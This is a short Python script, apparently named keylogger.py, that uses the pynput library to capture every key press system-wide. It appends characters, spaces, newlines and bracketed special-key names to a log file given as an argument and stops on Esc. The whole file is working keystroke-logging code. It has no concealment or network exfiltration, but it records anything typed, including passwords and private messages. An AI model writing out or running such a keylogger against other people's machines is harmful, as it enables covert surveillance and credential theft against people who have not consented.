from pynput import keyboard
import sys
import os

def main():
    # Check if the script was provided with a log file argument
    if len(sys.argv) < 2:
        print("Usage: python keylogger.py <log_file>")
        sys.exit(1)

    # Get the log file path from the command-line argument
    log_file = sys.argv[1]

    # Ensure the directory for the log file exists
    log_dir = os.path.dirname(log_file)
    if log_dir and not os.path.exists(log_dir):
        os.makedirs(log_dir)

    def on_press(key):
        try:
            # Write the character of the key to the file
            with open(log_file, "a") as file:
                if key.char:  # Regular keys
                    file.write(key.char)
        except AttributeError:
            # Handle special keys like space, enter, shift, etc.
            with open(log_file, "a") as file:
                if key == keyboard.Key.space:
                    file.write(" ")  # Write a space for the space key
                elif key == keyboard.Key.enter:
                    file.write("\n")  # Write a newline for the enter key
                else:
                    file.write(f"[{key.name}]")  # Write special keys in brackets

    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop the listener when the 'esc' key is pressed
            return False

    # Set up the listener for key events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
